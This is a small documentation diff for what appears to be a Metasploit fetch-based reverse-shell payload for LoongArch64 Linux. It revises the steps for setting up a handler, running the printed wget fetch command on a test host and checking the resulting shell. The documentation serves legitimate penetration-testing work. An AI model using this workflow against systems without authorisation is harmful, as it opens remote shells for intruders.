@@ -10,8 +10,8 @@ Linux LoongArch64 system with an HTTPS-capable download utility installed.
 1. Start `./msfconsole` and select `use exploit/multi/handler`.
 1. Set `PAYLOAD` to `cmd/linux/https/loongarch64/shell_reverse_tcp`.
 1. Set `LHOST`, `LPORT`, `FETCH_COMMAND` to `WGET`, and `VERBOSE` to `true`.
-1. Run the handler and execute the printed fetch command on the test host.
-1. In the resulting shell, run `id` and `uname -a`.
+1. Run the handler and execute the printed fetch command on the test host; the handler should open a command-shell session.
+1. In the resulting shell, run `id` and `uname -a`; verify that they report the test host's identity and LoongArch64 architecture.
 
 ## Options
 
@@ -51,4 +51,3 @@ Linux morefinels64 4.19.0-19-loongson-3 #1 SMP 4.19.190.8.26 Wed Oct 15 02:40:20
 [*] 10.5.132.181 - Command shell session 1 closed.
 
 ```
-
